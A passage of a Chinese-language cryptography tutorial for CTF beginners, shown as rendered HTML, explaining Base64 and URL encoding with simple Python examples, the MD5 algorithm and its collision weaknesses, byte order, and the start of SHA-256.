class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">64</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span>，所以每 6 個位元（Bit）為一個基本單元，對應著一個可列印字元。每 3 個位元組（Byte）為 24 個位元，相當於 4 個 Base64 基本單元，代表每 3 個位元組可以由 4 個可列印字元表示。下圖就是每個可列印字元所對應的索引值。</p><p><img src="https://hackmd.io/_uploads/r1KgQh5LR.png" alt="Base64 encoding table from GeeksforGeeks"></p><h3 id="Python-Code-2">Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># 使用 base64 模組的 b64encode 函式進行編碼</span></span><br><span class="line">    encoded_bytes = base64.b64encode(data)</span><br><span class="line">    <span class="comment"># 將編碼後的位元組轉換為字串並回傳</span></span><br><span class="line">    <span class="keyword">return</span> encoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_decode</span>(<span class="params">encoded_data</span>):</span><br><span class="line">    <span class="comment"># 將 Base64 編碼的字串轉為位元組</span></span><br><span class="line">    encoded_bytes = encoded_data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 用 base64 的 b64decode 解碼</span></span><br><span class="line">    decoded_bytes = base64.b64decode(encoded_bytes)</span><br><span class="line">    <span class="comment"># 回傳解碼後的字串</span></span><br><span class="line">    <span class="keyword">return</span> decoded_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 測試</span></span><br><span class="line">data_to_encode = <span class="string">b&quot;This is Base64 encoding&quot;</span></span><br><span class="line"></span><br><span class="line">encoded_data = base64_encode(data_to_encode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Base64 Encoded Data:&quot;</span>, encoded_data)</span><br><span class="line"></span><br><span class="line">decoded_data = base64_decode(encoded_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Base64 Decoded Data:&quot;</span>, decoded_data)</span><br></pre></td></tr></table></figure><h3 id="延伸">延伸</h3><p>除了 Base64 編碼以外，這個 Base 家族還有許多例如 Base16（Hex）、Base32、Base58（用於 Bitcoin）等不同的編碼方式。如果有興趣的話歡迎閱讀<a href="https://blog.csdn.net/Sciurdae/article/details/133642336">這篇文章</a>。</p><h2 id="URL-Encoding">URL Encoding</h2><h3 id="簡介-3">簡介</h3><p>URL Encoding 也稱作為 Percent-encoding，是一種將 URL 中的特殊字符和非 ASCII 字符轉換為百分號（%）後跟兩個十六進制數字的形式，以確保這些字符在 URL 中能夠被正確解析和傳輸。</p><h3 id="Python-Code-3">Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL 編碼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_encode</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">return</span> urllib.parse.quote(input_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL 解碼</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_decode</span>(<span class="params">encoded_string</span>):</span><br><span class="line">    <span class="keyword">return</span> urllib.parse.unquote(encoded_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">input_string = <span class="string">&quot;This is URL encoding&quot;</span></span><br><span class="line">url_encoded = url_encode(input_string)</span><br><span class="line">url_decoded = url_decode(url_encoded)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Original string:&quot;</span>, input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;URL encoded:&quot;</span>, url_encoded)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;URL decoded:&quot;</span>, url_decoded)</span><br></pre></td></tr></table></figure><h2 id="小結">小結</h2><p>這裡面其實在打 CTF 的時候最常用到的就是 Base64 了，所以其實只要熟悉一下 Base64 的原理還有代碼，在比賽的時候可以快速編碼解碼就可以啦！</p><h1 id="常見雜湊函式-Common-Hash-Functions">常見雜湊函式 Common Hash Functions</h1><p>如果想要了解一下哈希函式還有數位簽章的大致運作流程，可以在往下看之前先看一下這部影片。我自己認為它的內容簡單而且李永樂老師教的很清晰，幾乎沒有任何數學難度就可以理解！十分推薦去看！</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/uS1ZIAsvT5w" frameborder="0" allowfullscreen></iframe></div><h2 id="MD5">MD5</h2><h3 id="簡介-4">簡介</h3><p>MD5 的全名是 Message Digest Algorithm 5，它能將任意長度的數據轉換為 128 位（16 Bytes）長度的哈希值。它的運算過程如下：</p><ol><li><p><strong>填充資料</strong></p><ul><li>將資料的末尾添加一個&quot;1&quot;，為了標記填充的開始；然後添加足夠位的&quot;0&quot;，使資料的長度（以 Bit 為單位）對 512 取模後的結果為 448。這樣可以確保最終加上 64 位長度信息後，總長度是 512 的整數倍。</li><li>最後，將消息的原始長度（以位為單位）附加到消息的末尾，使得填充後的消息長度為 512 的倍數。</li></ul></li><li><p><strong>初始化 MD 緩衝區</strong></p><ul><li>MD5 使用四個 32 位的變量（A, B, C, D）來存儲中間和最終的雜湊值。它們分別初始化為：<ul><li>A = 0x67452301</li><li>B = 0xEFCDAB89</li><li>C = 0x98BADCFE</li><li>D = 0x10325476</li></ul></li></ul></li><li><p><strong>處理資料</strong></p><ul><li><p>將填充後的資料以 512 位（64 Bytes）分成多個塊（Chunk）。</p></li><li><p>對於每個 512 位的塊，再分為 16 個 32 位的小塊。</p></li><li><p>用這些 32 位的小塊和上面初始化好的四個 32 位的變量（A, B, C, D），進行四輪（每輪 16 步）迭代運算。每一步使用非線性函數（F, G, H, I）和特定的常數以及循環左移操作，來混淆和壓縮數據。公式如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>F</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo separator="true">,</mo><mi>Z</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>X</mi><mo>∧</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>∨</mo><mo stretchy="false">(</mo><mi mathvariant="normal">¬</mi><mi>X</mi><mo>∧</mo><mi>Z</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>G</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo separator="true">,</mo><mi>Z</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>X</mi><mo>∧</mo><mi>Z</mi><mo stretchy="false">)</mo><mo>∨</mo><mo stretchy="false">(</mo><mi>Y</mi><mo>∧</mo><mi mathvariant="normal">¬</mi><mi>Z</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo separator="true">,</mo><mi>Z</mi><mo stretchy="false">)</mo><mo>=</mo><mi>X</mi><mo>⊕</mo><mi>Y</mi><mo>⊕</mo><mi>Z</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo separator="true">,</mo><mi>Z</mi><mo stretchy="false">)</mo><mo>=</mo><mi>Y</mi><mo>⊕</mo><mo stretchy="false">(</mo><mi>X</mi><mo>∨</mo><mi mathvariant="normal">¬</mi><mi>Z</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>⊕</mo><mo separator="true">,</mo><mo>∧</mo><mo separator="true">,</mo><mo>∨</mo><mo separator="true">,</mo><mi mathvariant="normal">¬</mi><mtext> are the signs of XOR, AND, OR, NOT</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}&amp;F(X, Y, Z) = (X \land Y) \lor (\neg X \land Z) \\&amp;G(X, Y, Z) = (X \land Z) \lor (Y \land \neg Z) \\&amp;H(X, Y, Z) = X \oplus Y \oplus Z \\&amp;I(X, Y, Z) = Y \oplus (X \lor \neg Z) \\&amp;\oplus, \land, \lor, \neg \text{ are the signs of XOR, AND, OR, NOT}\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.5em;vertical-align:-3.5em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4em;"><span style="top:-6em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-4.5em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-3em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-1.5em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:0em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.5em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4em;"><span style="top:-6.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord">¬</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span></span></span><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal">G</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">¬</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">¬</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span></span></span><span style="top:-0.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mord">⊕</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∧</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∨</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">¬</span><span class="mord text"><span class="mord"> are the signs of XOR, AND, OR, NOT</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.5em;"><span></span></span></span></span></span></span></span></span></span></span></span></p></li></ul></li><li><p><strong>輸出最終哈希值</strong></p><ul><li>最終將四個 32 位的變量 A, B, C, D 串聯起來成為一個 128 位的哈希值（以小端序表示）。</li></ul></li></ol><p>看完文字敘述之後我們來看一下 MD5 的圖解吧！</p><p><img src="https://hackmd.io/_uploads/BJav5njU0.png" alt="圖示 MD5 from Wikipedia"></p><p>看完了那麼多可能有點頭昏腦脹，但沒關係！慢慢理解它的過程還有大致流程，多看幾次可能就比較理解了。接下來講點比較簡單理解的東西吧！甚麼是 Endian？</p><h3 id="端序-Endian">端序 Endian</h3><p>在了解端序是甚麼之前，我們先來講個有趣的吧！</p><blockquote><p>「endian」一詞來源於十八世紀愛爾蘭作家喬納森·斯威夫特（Jonathan Swift）的小說《格列佛遊記》（Gulliver’s Travels）。小說中，小人國為水煮蛋該從大的一端（Big-End）剝開還是小的一端（Little-End）剝開而爭論，爭論的雙方分別被稱為「大頭派（Big-Endians）」和「小頭派（Little-Endians）」。（From <a href="https://zh.wikipedia.org/zh-tw/%E5%AD%97%E8%8A%82%E5%BA%8F">Wikipedia</a>）</p></blockquote><p>好了這真的十分不重要但還是滿有趣的 XD。進入正題吧！</p><p>端序，又稱位元組順序，又稱尾序。它指的是排列位元組的順序或方式。它又分為以下兩種：</p><ol><li><strong>大端序 Big-Endian</strong></li><li><strong>小端序 little-Endian</strong></li></ol><p>那他們具體又有甚麼差別呢？下面一張圖看完馬上可以理解其中的差別在哪！</p><p><img src="https://hackmd.io/_uploads/ryh8Rhj8C.png" alt="Source: The Bit Theories"></p><p>如果這張圖還是不能理解，那我們再看下一張圖！</p><p><img src="https://hackmd.io/_uploads/rJO9p3iI0.png" alt="Little Endian, things are stored in reverse order. Source: fundd.blogspot.in"></p><p>如果看圖片看不太懂，那就用文字來介紹一下。</p><p>首先，要先知道甚麼是 LSB 和 MSB，LSB 是最低有效位（Least Significant Bit，LSB）；MSB 是最高有效位（Most Significant Bit，MSB）。和十進制類似，通常 MSB 是二進制數的最左側，而 LSB 位於最右側。</p><p>而大端序就是是從數據的 MSB 作為起始位置；而小端序是從最低有效位 LSB 開始。</p><p>那大端序和小端序在應用上有甚麼差別呢？</p><ol><li><strong>大端序</strong><ul><li>更加直觀</li><li>應用於一些網絡協議中，例如 TCP/IP</li></ul></li><li><strong>小端序</strong><ul><li>更符合計算機科學中的數學計算順序，因為最低有效位在前面更方便處理。（像是數據型態的轉換）</li></ul></li></ol><p>端序的部份我就大致介紹到這邊。如果對端序有興趣想要更深入了解的話，可以去看<a href="https://blog.csdn.net/kevin_tech/article/details/113979523">這篇文章</a>！</p><h3 id="Python-Code-4">Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要雜湊的消息</span></span><br><span class="line">message = <span class="string">&quot;This is MD5!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 創建一個 MD5 雜湊對象</span></span><br><span class="line">md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將消息編碼後更新到雜湊對象中</span></span><br><span class="line">md5_hash.update(message.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取雜湊值（十六進制表示）</span></span><br><span class="line">hash_hex = md5_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印雜湊值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;MD5 value: <span class="subst">&#123;hash_hex&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="MD5-已死">MD5 已死</h3><p>為甚麼說 MD5 已死呢？在 2004 年，中國的密碼學家王小雲和其研究同事發表了一篇論文，詳細描述了如何在不到一個小時內找到 MD5 的碰撞，同時這也證明了 MD5 是不安全的。</p><p>2012 年的時候密碼學研究人員 Marc Stevens 提出了一種更高效的 MD5 碰撞攻擊方法，稱為 Fast Collision Attack on MD5，他還開發了一個名為 HashClash 的工具，用於自動化生成 MD5 碰撞。</p><p>想更詳細的了解其原理，可以觀看以下影片！</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/aHeRBeJLjMI" frameborder="0" allowfullscreen></iframe></div><h2 id="SHA-256">SHA-256</h2><h3 id="簡介-5">簡介</h3><p>SHA(Secure Hash Algorithm)家族的雜湊函式是被美國聯邦資訊處理標準（FIPS）所認證的安全雜湊算法。他們（SHA 家族）是由美國國家安全局所設計，並由美國國家標準與技術研究院所發布的。他們家族中除了 SHA-256 以外還有 SHA-224、SHA-512 等等的雜湊函式，但這裡就主要講解最常見的 SHA-256。</p><p>SHA-256 和 MD5 其實流程是差不多的，大概的流程如下：</p><ol><li><p><strong>填充資料</strong></p><ul><li>將資料的末尾添加一個&quot;1&quot;，為了標記填充的開始</li><li>添加&quot;0&quot;位，直到資料的長度對 512 取模後等於 448。</li><li>最後，將資料的原始長度（以 Bit 為單位）附加到末尾，使得填充後的資料長度為 512 的倍數。</li></ul></li><li><p><strong>初始化緩衝區</strong></p><ul><li>SHA-256 使用八個 32 位元的變量來存儲中間和最終的雜湊值：<ul><li>h0 = 0x6a09e667</li><li>h1 = 0xbb67ae85</li><li>h2 = 0x3c6ef372</li><li>h3 = 0xa54ff53a</li><li>h4 = 0x510e527f</li><li>h5 = 0x9b05688c</li><li>h6 = 0x1f83d9ab</li><li>h7 = 0x5be0cd19</li></ul></li><li>是對自然數中前 8 個質數（2, 3, 5, 7, 11, 13, 17, 19）的平方根的小數部分取前 32 bits 而來。</li></ul></li><li><p><strong>處理資料</strong></p><ul><li><p>將填充後的資料以 512 位（64 Bytes）分成多個塊（Chunk）</p></li><li><p>對於每個 512 位的塊，再分為 16 個 32 位的小塊。</p></li><li><p>用這些 32 位的小塊和原本初始化好的 8 個變量進行迭代運算，由於過程太過於複雜，我會將其公式定義和圖解放在下面。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>C</mi><mi>h</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>∧</mo><mi>y</mi><mo stretchy="false">)</mo><mo>⊕</mo><mo stretchy="false">(</mo><mi mathvariant="normal">¬</mi><mi>x</mi><mo>∧</mo><mi>z</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>M</mi><mi>a</mi><mi>j</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>∧</mo><mi>y</mi><mo stretchy="false">)</mo><mo>⊕</mo><mo stretchy="false">(</mo><mi>x</mi><mo>∧</mo><mi>z</mi><mo stretchy="false">)</mo><mo>⊕</mo><mo stretchy="false">(</mo><mi>y</mi><mo>∧</mo><mi>z</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><msub><mi mathvariant="normal">Σ</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>S</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊕</mo><msup><mi>S</mi><mn>13</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊕</mo><msup><mi>S</mi><mn>22</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><msub><mi mathvariant="normal">Σ</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>S</mi><mn>6</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊕</mo><msup><mi>S</mi><mn>11</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊕</mo><msup><mi>S</mi><mn>25</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><msub><mi>σ</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>S</mi><mn>7</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊕</mo><msup><mi>S</mi><mn>18</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊕</mo><msup><mi>R</mi><mn>3</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><msub><mi>σ</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>S</mi><mn>17</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊕</mo><msup><mi>S</mi><mn>19</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊕</mo><msup><mi>R</mi><mn>10</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}&amp;Ch(x, y, z) = (x \land y) \oplus (\neg x \land z) \\&amp;Maj(x, y, z) = (x \land y) \oplus (x \land z) \oplus (y \land z) \\&amp;\Sigma_0(x) = S^2(x) \oplus S^{13}(x) \oplus S^{22}(x) \\&amp;\Sigma_1(x) = S^6(x) \oplus S^{11}(x) \oplus S^{25}(x) \\&amp;\sigma_0(x) = S^7(x) \oplus S^{18}(x) \oplus R^3(x) \\&amp;\sigma_1(x) = S^{17}(x) \oplus S^{19}(x) \oplus R^{10}(x)\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:9.0964em;vertical-align:-4.2982em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.7982em;"><span style="top:-6.8223em;"><span class="pstrut" style="height:2.8641em;"></span><span class="mord"></span></span><span style="top:-5.3223em;"><span class="pstrut" style="height:2.8641em;"></span><span class="mord"></span></span><span style="top:-3.7982em;"><span class="pstrut" style="height:2.8641em;"></span><span class="mord"></span></span><span style="top:-2.2741em;"><span class="pstrut" style="height:2.8641em;"></span><span class="mord"></span></span><span style="top:-0.75em;"><span class="pstrut" style="height:2.8641em;"></span><span class="mord"></span></span><span style="top:0.7741em;"><span class="pstrut" style="height:2.8641em;"></span><span class="mord"></span></span></span><span 